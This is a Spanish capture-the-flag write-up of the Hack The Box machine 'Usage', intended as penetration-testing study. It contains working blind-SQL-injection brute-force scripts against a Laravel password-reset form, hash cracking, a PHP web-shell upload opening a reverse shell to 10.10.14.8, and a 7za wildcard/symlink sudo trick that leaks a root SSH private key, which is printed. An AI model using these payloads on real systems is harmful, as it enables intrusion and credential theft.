# Usage

![](../../../../~gitbook/image.md)Publicado: 22 de Mayo de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
### 📝 Descripción
En esta máquina de Hack The Box llamada Usage, nos enfrentamos a una aplicación web construida con el framework PHP Laravel, alojada en un servidor nginx sobre un sistema Linux. A través de una fase inicial de reconocimiento, identificamos rápidamente que el sitio hace uso de virtual hosting.La clave para avanzar radica en una vulnerabilidad SQL Injection a ciegas (Blind SQLi) detectada en la funcionalidad de recuperación de contraseña del sitio principal. Mediante el uso de payloads manuales y scripts automatizados en Python, conseguimos explotar dicha vulnerabilidad para exfiltrar información sensible directamente desde la base de datos.Esta máquina es ideal para practicar técnicas de inyección SQL a ciegas, explotación web en entornos Laravel y scripting para automatización de tareas ofensivas.
### 🔭 Reconocimiento

#### Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
#### Escaneo de puertos

#### Enumeración de servicios
⚠️ Importante: Detectamos durante la fase de enumeración con nmap que se está realizando virtual hosting. Debemos añadir el siguiente vhost a nuestro fichero /etc/hosts
### 🌐 Enumeración Web

#### 80 HTTP (usage.htb - admin.usage.htb)
http://usage.htb![](../../../../~gitbook/image.md)Usamos la opción de Registro y nos autenticamos pero no vemos nada interesante a priori:![](../../../../~gitbook/image.md)Usamos Wappalyzer para enumerar un poco las tecnologías usadas y vemos que el framework principal que se ha usado para el sitio es Laravel, un framework de php.![](../../../../~gitbook/image.md)Vamos a analizar un poco la opción de Reset Password para ver qué está realizando por detrás:![](../../../../~gitbook/image.md)Verificamos si alguno de los campos del formulario es vulnerable a algún tipo de inyección.![](../../../../~gitbook/image.md)Al introducir una comilla en el campo e-mail obtenemos un error 500, señal de que el backend no está manejando correctamente ni sanitizando el campo de entrada:![](../../../../~gitbook/image.md)Confirmamos la vulnerabilidad SQLi con el siguiente payload:![](../../../../~gitbook/image.md)No vemos ningún tipo de error reflejado que nos pueda aportar información sobre el nombre de la base de datos o algún otro campo, por lo que se trata de una inyección a ciegas (blind sqli)Aquí podríamos usar sqlmap o también podemos realizalo de forma manual montar unos script en python que mediante la función substring nos permita mediante fuerza bruta ir adivinando el nombre de la base de datos y las tablas:Enumeración de base de datosBásicamente este script automatiza la petición que hemos visto anteriormente al endpoint forget-password y aplica la siguiente inyección test' OR substring(database(),{i},1)='{character}'-- - para ir determinando el carácter que corresponde a cada posición del nombre de la base de datos.Para saber si el carácter es correcto evalúa si la cadena "We have e-mailed your password" llega en la respuesta.Vemos que el script funciona y ya tenemos el nombre de la base de datos:![](../../../../~gitbook/image.md)Ahora que ya tenemos el nombre de la base de datos, si ahora quisiéramos averiguar las tablas de dicha base de datos podemos jugar con una nested query. Para ello hacemos algunos cambios en el script anterior dejándolo de la siguiente forma:Enumeración de tablas de una base de datos específicaBásicamente realizamos algunos ajustes y cambiamos el payload de la inyección para que en el substring en lugar del nombre de la base de datos, usamos group_concat para retornar los nombres de las tablas separados por coma y vamos comparando con cada carácter en cada iteración del bucle:![[Pasted image 20250522193104.png]]Encontramos una tabla interesante llamada admin_users de la cual nos podría interesar extraer su contenido.Enumeración de columnas de una tablaHemos realizado unos ajustes al script anterior y modificado el payload para consultar las columnas especificando el nombre de la base de datos y el nombre de la tabla:![](../../../../~gitbook/image.md)Ahora que ya tenemos los nombres de las columnas, únicamente nos queda extraer su contenido, así que volvemos a modificar el script:Obtenemos el usuario y la contraseña en formato hash:![](../../../../~gitbook/image.md)Usamos la herramienta nth para comprobar qué tipo de hash es aunque a priori viéndolo ya parece que es bcrypt:![](../../../../~gitbook/image.md)Usamos hashcat y rockyou para crackearlo:![](../../../../~gitbook/image.md)Obtenemos la contraseña de `admin: whatever1`http://admin.usage.htb![](../../../../~gitbook/image.md)Probamos a autenticarnos en el panel de administración con las credenciales admin:whatever1![](../../../../~gitbook/image.md)
### 💻 Explotación
CVE-2023-24249Tras verificar las versiones de Laravel y PHP no parece haber exploits, aunque sí que encontramos algo interesante para una de las dependencias que estamos enumerando![](../../../../~gitbook/image.md)Parece que hay un CVE-2023-24249 con una vulnerabilidad de tipo arbitrary file upload relacionada con el componente de administración que permite cambiar la foto de perfil:Hay documentación sobre cómo explotar esta vulnerabilidad:https://flyd.uk/post/cve-2023-24249/![](../../../../~gitbook/image.md)Subimos una imagen cualquiera jpg e interceptamos la petición con burp y cambiamos la extensión del archivo añadiendo un .php al final y reemplazamos el contenido por una php bash one liner:Vemos la ruta donde se ha subido el archivo:![](../../../../~gitbook/image.md)Iniciamos un listener con netcat
#### Foothold
Accedemos al recurso que hemos subido en /uploads/images/cat.jpg.php y obtenemos acceso a la máquina como usuario dash:![](../../../../~gitbook/image.md)Obtenemos la primera flag en el directorio de usuario de dash:![](../../../../~gitbook/image.md)
#### 👑 Escalada de privilegios
Comenzamos a enumerar la máquina y encontramos las credenciales de base de datos en la siguiente ubicación:![](../../../../~gitbook/image.md)Probamos a reutilizarla con los usuarios dash y xander pero no funciona.En el directorio del usuario dash existe un fichero .monitrc en el que también hay otra contraseña:![](../../../../~gitbook/image.md)Usamos esta credencial para autenticarnos como xander y tenemos éxito:Verificamos si hay algún usuario que pueda ejecutar algún binario como rootComprobamos que el usuario xander tiene permisos de lectura y ejecución sobre este binarioEjecutamos la herramienta probando las 3 opciones aunque no nos permite hacer gran cosa por temas de permisos.Usamos el comando strings con el binario para ver si vemos algo interesante:![](../../../../~gitbook/image.md)Aquí podría haber algo, ya que se está haciendo uso de wildcard.
Hay un artículo interesante sobre esto en HackTrickshttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html![](../../../../~gitbook/image.md)Seguimos los pasos indicados en la documentación y creamos un archivo @id_rsa, a continuación creamos un enlace simbólico al archivo /root/.ssh/id_rsa y finalmente lo movemos al directorio del que lee el comando 7za que es /var/www/html:![](../../../../~gitbook/image.md)Hemos creado un enlace simbólico en este caso al id_rsa de root para que se ejecute la herramienta y vaya a comprimir todo lo que hay en el directorio /var/www/html pues también procese nuestro archivo id_rsa que apunta a la clave ssh del usuario root![](../../../../~gitbook/image.md)Vemos la clave privada de root que podemos copiar en el directorio /tmp de la máquina, darle permisos 600 y usar para conectarnos a la máquina como rootid_rsa![](../../../../~gitbook/image.md)Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)
- [💻 Explotación](#explotacion)

```
❯  ping -c2 10.10.11.18
PING 10.10.11.18 (10.10.11.18) 56(84) bytes of data.
64 bytes from 10.10.11.18: icmp_seq=1 ttl=63 time=48.0 ms
64 bytes from 10.10.11.18: icmp_seq=2 ttl=63 time=47.5 ms

--- 10.10.11.18 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 47.537/47.790/48.044/0.253 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.18 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
22,80
```

```
nmap -sC -sV -p$ports 10.10.11.18 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-22 17:17 CEST
Nmap scan report for 10.10.11.18
Host is up (0.046s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```
echo "10.10.11.18 usage.htb admin.usage.htb" | sudo tee -a /etc/hosts
```

```
admin' or '1'='1
```

```
# !/usr/bin/env python3

import requests
import signal
import time
import sys
import string

from pwn import *
from termcolor import colored

def def_handler(sig, frame):
print(colored("\n\n[!] Saliendo...\n", 'red'))
sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# === Establecer los valores de las cookies de la petición ===
cookies = {
'XSRF-TOKEN': 'eyJpdiI6IndyVEJBVXFJSWJuNEhjMTdtdUorTFE9PSIsInZhbHVlIjoicDM3dlFuS01meENlT2ZmaWtBTEtzZTEweVFwcDNVQ1gyUjlJMElEUzVldjhSRDJxWHZzUThGWU1BN2N2TVd2amIrNUtoQUF3dnBIVFVGbUVCY3c1ZjBwanJ0U1l3NmN2ZUE5ajJKVzJOOWRnUFJnSC9reDFQOWZPd0wySVRFV2kiLCJtYWMiOiJmMjk3NjQzN2I5Y2RmYWZlYmRhNzkwMjQwNjNiZGUxOGZhZjk0MTZhYTBiMDNmZDk1Zjg5MTAyMzMyMTA5NDhhIiwidGFnIjoiIn0=',
'laravel_session': 'eyJpdiI6IklLTDhXdXBOWUFVazlVSEN5MHdRM3c9PSIsInZhbHVlIjoiZ25hZmpSZXVTR0c1dXZnZW5aOGM2akd3K0pjSHIxeXBsQ1h4dHk1bzhNUzZmaXNoQjFGUFAzaTYzM2JqU211VCtRem5QRE56T3VLQ3lmdTI2YUxMVGU1M3gyMld5T25YNEQ2bTJsRTNoZkRuSGZFRUVQUmltL3FUY1lKemV6ZFYiLCJtYWMiOiI3M2Y5ZTkwY2EyNTcwMWFmMWZiZjE2ZjcwMjY0ZTFkNTVjZjg3NmU3YWIxZDk3MWRkYjlhY2MwOGFlOWQ1MzUzIiwidGFnIjoiIn0='
}

# === Configuración ===
main_url = "http://usage.htb/forget-password"
csrf_token = "6PIGyDbYvuUCapSnq5BoNV7HHRmU04Ax9f9QrhTP"

characters = string.ascii_lowercase + string.digits + '_'

def makeSQLi():
p1 = log.progress("Fuerza bruta")
p1.status("Iniciando...")

database = ""
p2 = log.progress("Base de datos")

for i in range(1, 50):  # Hasta 50 caracteres del nombre de la DB
found = False
for character in characters:
payload = f"test' OR substring(database(),{i},1)='{character}'-- -"

post_data = {
'_token': csrf_token,
'email': payload
}

p1.status(f"Probando: {character} en posición {i}")
r = requests.post(main_url, data=post_data, cookies=cookies)

if "We have e-mailed your password" in r.text:
database += character
p2.status(database)
found = True
break

if not found:
break  # Fin de la cadena

print(colored(f"\n[+] Nombre de la base de datos: {database}", 'green'))

if __name__ == '__main__':
makeSQLi()

```

```
# !/usr/bin/env python3

import requests
import signal
import time
import sys
import string

from pwn import *
from termcolor import colored

def def_handler(sig, frame):
print(colored("\n\n[!] Saliendo...\n", 'red'))
sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# === Cookies reales desde la petición ===
cookies = {
'XSRF-TOKEN': 'eyJpdiI6IndyVEJBVXFJSWJuNEhjMTdtdUorTFE9PSIsInZhbHVlIjoicDM3dlFuS01meENlT2ZmaWtBTEtzZTEweVFwcDNVQ1gyUjlJMElEUzVldjhSRDJxWHZzUThGWU1BN2N2TVd2amIrNUtoQUF3dnBIVFVGbUVCY3c1ZjBwanJ0U1l3NmN2ZUE5ajJKVzJOOWRnUFJnSC9reDFQOWZPd0wySVRFV2kiLCJtYWMiOiJmMjk3NjQzN2I5Y2RmYWZlYmRhNzkwMjQwNjNiZGUxOGZhZjk0MTZhYTBiMDNmZDk1Zjg5MTAyMzMyMTA5NDhhIiwidGFnIjoiIn0=',
'laravel_session': 'eyJpdiI6IklLTDhXdXBOWUFVazlVSEN5MHdRM3c9PSIsInZhbHVlIjoiZ25hZmpSZXVTR0c1dXZnZW5aOGM2akd3K0pjSHIxeXBsQ1h4dHk1bzhNUzZmaXNoQjFGUFAzaTYzM2JqU211VCtRem5QRE56T3VLQ3lmdTI2YUxMVGU1M3gyMld5T25YNEQ2bTJsRTNoZkRuSGZFRUVQUmltL3FUY1lKemV6ZFYiLCJtYWMiOiI3M2Y5ZTkwY2EyNTcwMWFmMWZiZjE2ZjcwMjY0ZTFkNTVjZjg3NmU3YWIxZDk3MWRkYjlhY2MwOGFlOWQ1MzUzIiwidGFnIjoiIn0='
}

# === Configuración ===
main_url = "http://usage.htb/forget-password"
csrf_token = "6PIGyDbYvuUCapSnq5BoNV7HHRmU04Ax9f9QrhTP"

characters = string.ascii_lowercase + string.digits + '_,'

def makeSQLi():
p1 = log.progress("Fuerza bruta")
p1.status("Iniciando...")

tables = ""
p2 = log.progress("Tablas")

for i in range(1, 500):  # Hasta 50 caracteres del nombre de la DB
found = False
for character in characters:
payload = f"test' OR substring((select group_concat(table_name) from information_schema.tables where table_schema='usage_blog'),{i},1)='{character}'-- -"

post_data = {
'_token': csrf_token,
'email': payload
}

p1.status(f"Probando: {character} en posición {i}")
r = requests.post(main_url, data=post_data, cookies=cookies)

if "We have e-mailed your password" in r.text:
tables += character
p2.status(tables)
found = True
break

if not found:
break  # Fin de la cadena

print(colored(f"\n[+] Nombre de las tablas: {tables}", 'green'))

if __name__ == '__main__':
makeSQLi()

```

```
payload = f"test' OR substring((select group_concat(table_name) from information_schema.tables where table_schema='usage_blog'),{i},1)='{character}'-- -"
```

```
# !/usr/bin/env python3

import requests
import signal
import time
import sys
import string

from pwn import *
from termcolor import colored

def def_handler(sig, frame):
print(colored("\n\n[!] Saliendo...\n", 'red'))
sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# === Cookies reales desde la petición ===
cookies = {
'XSRF-TOKEN': 'eyJpdiI6IndyVEJBVXFJSWJuNEhjMTdtdUorTFE9PSIsInZhbHVlIjoicDM3dlFuS01meENlT2ZmaWtBTEtzZTEweVFwcDNVQ1gyUjlJMElEUzVldjhSRDJxWHZzUThGWU1BN2N2TVd2amIrNUtoQUF3dnBIVFVGbUVCY3c1ZjBwanJ0U1l3NmN2ZUE5ajJKVzJOOWRnUFJnSC9reDFQOWZPd0wySVRFV2kiLCJtYWMiOiJmMjk3NjQzN2I5Y2RmYWZlYmRhNzkwMjQwNjNiZGUxOGZhZjk0MTZhYTBiMDNmZDk1Zjg5MTAyMzMyMTA5NDhhIiwidGFnIjoiIn0=',
'laravel_session': 'eyJpdiI6IklLTDhXdXBOWUFVazlVSEN5MHdRM3c9PSIsInZhbHVlIjoiZ25hZmpSZXVTR0c1dXZnZW5aOGM2akd3K0pjSHIxeXBsQ1h4dHk1bzhNUzZmaXNoQjFGUFAzaTYzM2JqU211VCtRem5QRE56T3VLQ3lmdTI2YUxMVGU1M3gyMld5T25YNEQ2bTJsRTNoZkRuSGZFRUVQUmltL3FUY1lKemV6ZFYiLCJtYWMiOiI3M2Y5ZTkwY2EyNTcwMWFmMWZiZjE2ZjcwMjY0ZTFkNTVjZjg3NmU3YWIxZDk3MWRkYjlhY2MwOGFlOWQ1MzUzIiwidGFnIjoiIn0='
}

# === Configuración ===
main_url = "http://usage.htb/forget-password"
csrf_token = "6PIGyDbYvuUCapSnq5BoNV7HHRmU04Ax9f9QrhTP"

characters = string.ascii_lowercase + string.digits + '_,'

def makeSQLi():
p1 = log.progress("Fuerza bruta")
p1.status("Iniciando...")

columns = ""
p2 = log.progress("Columnas")

for i in range(1, 500):  # Hasta 50 caracteres del nombre de la DB
found = False
for character in characters:
payload = f"test' OR substring((select group_concat(column_name) from information_schema.columns where table_schema='usage_blog' and table_name='admin_users'),{i},1)='{character}'-- -"

post_data = {
'_token': csrf_token,
'email': payload
}

p1.status(f"Probando: {character} en posición {i}")
r = requests.post(main_url, data=post_data, cookies=cookies)

if "We have e-mailed your password" in r.text:
columns += character
p2.status(columns)
found = True
break

if not found:
break  # Fin de la cadena

print(colored(f"\n[+] Nombre de las columnas: {columns}", 'green'))

if __name__ == '__main__':
makeSQLi()

```

```
payload = f"test' OR substring((select group_concat(column_name) from information_schema.columns where table_schema='usage_blog' and table_name='admin_users'),{i},1)='{character}'-- -"
```

```
# !/usr/bin/env python3

import requests
import signal
import time
import sys
import string

from pwn import *
from termcolor import colored

def def_handler(sig, frame):
print(colored("\n\n[!] Saliendo...\n", 'red'))
sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# === Cookies reales desde la petición ===
cookies = {
'XSRF-TOKEN': 'eyJpdiI6IndyVEJBVXFJSWJuNEhjMTdtdUorTFE9PSIsInZhbHVlIjoicDM3dlFuS01meENlT2ZmaWtBTEtzZTEweVFwcDNVQ1gyUjlJMElEUzVldjhSRDJxWHZzUThGWU1BN2N2TVd2amIrNUtoQUF3dnBIVFVGbUVCY3c1ZjBwanJ0U1l3NmN2ZUE5ajJKVzJOOWRnUFJnSC9reDFQOWZPd0wySVRFV2kiLCJtYWMiOiJmMjk3NjQzN2I5Y2RmYWZlYmRhNzkwMjQwNjNiZGUxOGZhZjk0MTZhYTBiMDNmZDk1Zjg5MTAyMzMyMTA5NDhhIiwidGFnIjoiIn0=',
'laravel_session': 'eyJpdiI6IklLTDhXdXBOWUFVazlVSEN5MHdRM3c9PSIsInZhbHVlIjoiZ25hZmpSZXVTR0c1dXZnZW5aOGM2akd3K0pjSHIxeXBsQ1h4dHk1bzhNUzZmaXNoQjFGUFAzaTYzM2JqU211VCtRem5QRE56T3VLQ3lmdTI2YUxMVGU1M3gyMld5T25YNEQ2bTJsRTNoZkRuSGZFRUVQUmltL3FUY1lKemV6ZFYiLCJtYWMiOiI3M2Y5ZTkwY2EyNTcwMWFmMWZiZjE2ZjcwMjY0ZTFkNTVjZjg3NmU3YWIxZDk3MWRkYjlhY2MwOGFlOWQ1MzUzIiwidGFnIjoiIn0='
}

# === Configuración ===
main_url = "http://usage.htb/forget-password"
csrf_token = "6PIGyDbYvuUCapSnq5BoNV7HHRmU04Ax9f9QrhTP"

characters = string.ascii_lowercase + string.digits + string.ascii_uppercase + string.digits + '_,$./@:&*'

def makeSQLi():
p1 = log.progress("Fuerza bruta")
p1.status("Iniciando...")

columns = ""
p2 = log.progress("Columnas")

for i in range(1, 500):  # Hasta 50 caracteres del nombre de la DB
found = False
for character in characters:
payload = f"test' OR substring((SELECT GROUP_CONCAT(BINARY username, ':', BINARY password) FROM admin_users), {i}, 1) = '{character}'-- -"

post_data = {
'_token': csrf_token,
'email': payload
}

p1.status(f"Probando: {character} en posición {i}")
r = requests.post(main_url, data=post_data, cookies=cookies)

if "We have e-mailed your password" in r.text:
columns += character
p2.status(columns)
found = True
break

if not found:
break  # Fin de la cadena

print(colored(f"\n[+] Nombre de las columnas: {columns}", 'green'))

if __name__ == '__main__':
makeSQLi()
```

```
nth --text '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2'
```

```
hashcat -m 3200 admin_hash_bcrypt /usr/share/wordlists/rockyou.txt
```

```
& /dev/tcp/10.10.14.8/1234 0>&1"'); ?>
```

```
nc -nlvp 1234
```

```
/var/www/html/project_admin/.env
```

```
xander@usage:~$ whoami
xander
xander@usage:~$ ls -la
total 24
drwxr-x--- 4 xander xander 4096 Apr  2  2024 .
drwxr-xr-x 4 root   root   4096 Aug 16  2023 ..
lrwxrwxrwx 1 xander xander    9 Apr  2  2024 .bash_history -> /dev/null
-rw-r--r-- 1 xander xander 3771 Jan  6  2022 .bashrc
drwx------ 3 xander xander 4096 Aug 20  2023 .config
-rw-r--r-- 1 xander xander  807 Jan  6  2022 .profile
drwx------ 2 xander xander 4096 Apr  8  2024 .ssh
```

```
xander@usage:~$ sudo -l
Matching Defaults entries for xander on usage:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
use_pty

User xander may run the following commands on usage:
(ALL : ALL) NOPASSWD: /usr/bin/usage_management
```

```
xander@usage:~$ ls -la /usr/bin/usage_management
-rwxr-xr-x 1 root root 16312 Oct 28  2023 /usr/bin/usage_management
xander@usage:~$
```

```
strings /usr/bin/usage_management
```

```
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
Error changing working directory to /var/www/html
```

```
cd /var/www/html
touch  @id_rsa
ln -s /root/.ssh/id_rsa id_rsa
```

```
sudo /usr/bin/usage_management
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
-----END OPENSSH PRIVATE KEY-----
```

```
chmod 600 id_rsa
ssh -i id_rsa root@localhost
```
